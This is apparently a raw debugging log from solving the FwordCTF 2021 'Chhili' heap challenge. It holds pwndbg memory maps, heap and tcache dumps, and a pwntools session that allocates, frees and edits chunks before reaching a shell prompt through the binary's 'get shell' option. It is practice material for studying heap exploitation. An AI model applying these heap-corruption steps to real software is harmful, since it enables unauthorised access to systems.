@@ -1,0 +1,259 @@
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    0x555555554000     0x555555555000 r--p     1000 0      /home/mito/CTF/FwordCTF_2021/Pwn_Chhili/chhili
+    0x555555555000     0x555555556000 r-xp     1000 1000   /home/mito/CTF/FwordCTF_2021/Pwn_Chhili/chhili
+    0x555555556000     0x555555557000 r--p     1000 2000   /home/mito/CTF/FwordCTF_2021/Pwn_Chhili/chhili
+    0x555555557000     0x555555558000 r--p     1000 2000   /home/mito/CTF/FwordCTF_2021/Pwn_Chhili/chhili
+    0x555555558000     0x555555559000 rw-p     1000 3000   /home/mito/CTF/FwordCTF_2021/Pwn_Chhili/chhili
+    0x555555559000     0x55555557a000 rw-p    21000 0      [heap]
+    0x7ffff7dbf000     0x7ffff7de4000 r--p    25000 0      /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7de4000     0x7ffff7f5c000 r-xp   178000 25000  /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7f5c000     0x7ffff7fa6000 r--p    4a000 19d000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7fa6000     0x7ffff7fa7000 ---p     1000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7fa7000     0x7ffff7faa000 r--p     3000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7faa000     0x7ffff7fad000 rw-p     3000 1ea000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7fad000     0x7ffff7fb3000 rw-p     6000 0      
+    0x7ffff7fcb000     0x7ffff7fce000 r--p     3000 0      [vvar]
+    0x7ffff7fce000     0x7ffff7fcf000 r-xp     1000 0      [vdso]
+    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000 0      /usr/lib/x86_64-linux-gnu/ld-2.31.so
+    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000 1000   /usr/lib/x86_64-linux-gnu/ld-2.31.so
+    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000 24000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
+    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 2c000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
+    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2d000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
+    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
+    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
+0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
+
+pwndbg> x/80gx 0x555555558000
+0x555555558000:	0x0000000000000000	0x0000555555558008
+0x555555558010:	0x0000000000000000	0x0000000000000000
+0x555555558020 <stdout@@GLIBC_2.2.5>:	0x00007ffff7fab6a0	0x0000000000000000
+0x555555558030 <stdin@@GLIBC_2.2.5>:	0x00007ffff7faa980	0x0000000000000000
+0x555555558040 <stderr@@GLIBC_2.2.5>:	0x00007ffff7fab5c0	0x0000000000000000
+0x555555558050 <chunk>:	0x0000000000000000	0x0000000000000000
+0x555555558060 <myChunk>:	0x0000555555559310	0x0000000000000040
+0x555555558070:	0x0000000000000000	0x0000000000000000
+0x555555558080:	0x0000000000000000	0x0000000000000000
+
+
+0x555555559270:	0x0000000000000000	0x0000000000000000
+0x555555559280:	0x0000000000000000	0x0000000000000000
+0x555555559290:	0x0000000000000000	0x0000000000000021
+0x5555555592a0:	0x00005555555592c0	0x00005555555592f0
+0x5555555592b0:	0x0000000000000000	0x0000000000000031
+0x5555555592c0:	0x4141414141414141	0x000000000000000a
+0x5555555592d0:	0x0000000000000000	0x0000000000000000
+0x5555555592e0:	0x0000000000000000	0x0000000000000021
+0x5555555592f0:	0x0000000000000000	0x0000000000000000
+0x555555559300:	0x0000000000000000	0x0000000000000021
+0x555555559310:	0x0000000000000000	0x0000555555559010
+0x555555559320:	0x0000000000000000	0x0000000000000031
+0x555555559330:	0x0000000000000000	0x0000555555559010
+0x555555559340:	0x0000000000000000	0x0000000000000000
+0x555555559350:	0x0000000000000000	0x0000000000000021
+0x555555559360:	0x0000000000000000	0x0000000000000000
+0x555555559370:	0x0000000000000000	0x0000000000000051
+0x555555559380:	0x0000000000000000	0x0000555555559010
+0x555555559390:	0x0000000000000000	0x0000000000000000
+0x5555555593a0:	0x0000000000000000	0x0000000000000000
+0x5555555593b0:	0x0000000000000000	0x0000000000000000
+0x5555555593c0:	0x0000000000000000	0x0000000000000021
+0x5555555593d0:	0x0000000000000000	0x0000000000000000
+0x5555555593e0:	0x0000000000000000	0x0000000000020c21
+0x5555555593f0:	0x0000000000000000	0x0000000000000000
+0x555555559400:	0x0000000000000000	0x0000000000000000
+0x555555559410:	0x0000000000000000	0x0000000000000000
+0x555555559420:	0x0000000000000000	0x0000000000000000
+0x555555559430:	0x0000000000000000	0x0000000000000000
+0x555555559440:	0x0000000000000000	0x0000000000000000
+0x555555559450:	0x0000000000000000	0x0000000000000000
+0x555555559460:	0x0000000000000000	0x0000000000000000
+0x555555559470:	0x0000000000000000	0x0000000000000000
+pwndbg> bins
+tcachebins
+0x20 [  1]: 0x555555559310 ◂— 0x0
+0x30 [  1]: 0x555555559330 ◂— 0x0
+0x50 [  1]: 0x555555559380 ◂— 0x0
+
+
+wndbg> x/80gx 0x7fffffffdf00
+0x7fffffffdf00:	0x0000000000000000	0x00007ffff7e5c2d4
+0x7fffffffdf10:	0x00005555555556d0	0x00007fffffffdfd0
+0x7fffffffdf20:	0x00005555555551e0	0x0000555555555483
+0x7fffffffdf30:	0x0000007f00000d68	0x0000555555559360
+0x7fffffffdf40:	0x6464646464646464	0x6464646464646464
+0x7fffffffdf50:	0x6464646464646464	0x6464646464646464
+0x7fffffffdf60:	0x0000555555550a64	0x00007ffff7fac4a0
+0x7fffffffdf70:	0x0000000000000000	0x00007ffff7e53013
+0x7fffffffdf80:	0x0000000000000008	0x00007ffff7fab6a0
+0x7fffffffdf90:	0x0000555555556044	0x00007ffff7e4671a
+0x7fffffffdfa0:	0x00005555555556d0	0x00007fffffffdfd0
+0x7fffffffdfb0:	0x00005555555551e0	0x0000555555555619
+
+pwndbg> search admin
+chhili          0x555555556064 0x622f006e696d6461 /* 'admin' */
+chhili          0x555555557064 0x622f006e696d6461 /* 'admin' */
+[heap]          0x555555559338 0x6e696d6461 /* 'admin' */
+
+
+pwndbg> x/80gx 0x7fffffffdf00
+0x7fffffffdf00:	0x0000000000000000	0x00007ffff7e5c2d4
+0x7fffffffdf10:	0x00005555555556d0	0x00007fffffffdfd0
+0x7fffffffdf20:	0x00005555555551e0	0x0000555555555483
+0x7fffffffdf30:	0x0000007f00000d68	0x0000555555559400
+0x7fffffffdf40:	0x7a7a7a7a7a7a7a7a	0x000000000000000a
+0x7fffffffdf50:	0x00007ffff7fab6a0	0x0000555555556044
+0x7fffffffdf60:	0x0000555555558020	0x00007ffff7fac4a0
+0x7fffffffdf70:	0x0000000000000000	0x00007ffff7e53013
+0x7fffffffdf80:	0x0000000000000008	0x00007ffff7fab6a0
+0x7fffffffdf90:	0x0000555555556044	0x00007ffff7e4671a
+0x7fffffffdfa0:	0x00005555555556d0	0x00007fffffffdfd0
+0x7fffffffdfb0:	0x00005555555551e0	0x0000555555555619
+0x7fffffffdfc0:	0x0000000100000000	0x04c5ea15a93f0200
+0x7fffffffdfd0:	0x00007fffffffdff0	0x000055555555568f
+0x7fffffffdfe0:	0x00007fffffffe0e0	0x0000000100000000
+0x7fffffffdff0:	0x0000000000000000	0x00007ffff7de60b3
+
+
+[DEBUG] PLT 0x25304 __libpthread_freeres
+[DEBUG] PLT 0x25314 malloc
+[DEBUG] PLT 0x25324 __libdl_freeres
+[DEBUG] PLT 0x25334 free
+[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[DEBUG] Received 0x48 bytes:
+    b'Select an action\n'
+    b'(1) malloc\n'
+    b'(2) free\n'
+    b'(3) edit\n'
+    b'(4) get shell\n'
+    b'(5) exit\n'
+    b'>> '
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0xb bytes:
+    b'size : \n'
+    b'>> '
+[DEBUG] Sent 0x3 bytes:
+    b'24\n'
+[DEBUG] Received 0xb bytes:
+    b'data : \n'
+    b'>> '
+[DEBUG] Sent 0x18 bytes:
+    65 * 0x18
+[DEBUG] Received 0x48 bytes:
+    b'Select an action\n'
+    b'(1) malloc\n'
+    b'(2) free\n'
+    b'(3) edit\n'
+    b'(4) get shell\n'
+    b'(5) exit\n'
+    b'>> '
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0xb bytes:
+    b'size : \n'
+    b'>> '
+[DEBUG] Sent 0x3 bytes:
+    b'24\n'
+[DEBUG] Received 0xb bytes:
+    b'data : \n'
+    b'>> '
+[DEBUG] Sent 0x18 bytes:
+    66 * 0x18
+[*] Switching to interactive mode
+[DEBUG] Received 0x48 bytes:
+    b'Select an action\n'
+    b'(1) malloc\n'
+    b'(2) free\n'
+    b'(3) edit\n'
+    b'(4) get shell\n'
+    b'(5) exit\n'
+    b'>> '
+Select an action
+(1) malloc
+(2) free
+(3) edit
+(4) get shell
+(5) exit
+>> $ 2
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x48 bytes:
+    b'Select an action\n'
+    b'(1) malloc\n'
+    b'(2) free\n'
+    b'(3) edit\n'
+    b'(4) get shell\n'
+    b'(5) exit\n'
+    b'>> '
+Select an action
+(1) malloc
+(2) free
+(3) edit
+(4) get shell
+(5) exit
+>> $ 3
+[DEBUG] Sent 0x2 bytes:
+    b'3\n'
+[DEBUG] Received 0xb bytes:
+    b'data : \n'
+    b'>> '
+data : 
+>> $ AAAAAAAAAAAAAAAAAAAAA
+[DEBUG] Sent 0x16 bytes:
+    b'AAAAAAAAAAAAAAAAAAAAA\n'
+[DEBUG] Received 0x48 bytes:
+    b'Select an action\n'
+    b'(1) malloc\n'
+    b'(2) free\n'
+    b'(3) edit\n'
+    b'(4) get shell\n'
+    b'(5) exit\n'
+    b'>> '
+Select an action
+(1) malloc
+(2) free
+(3) edit
+(4) get shell
+(5) exit
+>> $ 1
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0xb bytes:
+    b'size : \n'
+    b'>> '
+size : 
+>> $ 32
+[DEBUG] Sent 0x3 bytes:
+    b'32\n'
+[DEBUG] Received 0xb bytes:
+    b'data : \n'
+    b'>> '
+data : 
+>> $ CCCCCCCCCCCc
+[DEBUG] Sent 0xd bytes:
+    b'CCCCCCCCCCCc\n'
+[DEBUG] Received 0x48 bytes:
+    b'Select an action\n'
+    b'(1) malloc\n'
+    b'(2) free\n'
+    b'(3) edit\n'
+    b'(4) get shell\n'
+    b'(5) exit\n'
+    b'>> '
+Select an action
+(1) malloc
+(2) free
+(3) edit
+(4) get shell
+(5) exit
+>> $ 4
+[DEBUG] Sent 0x2 bytes:
+    b'4\n'
+$  
+
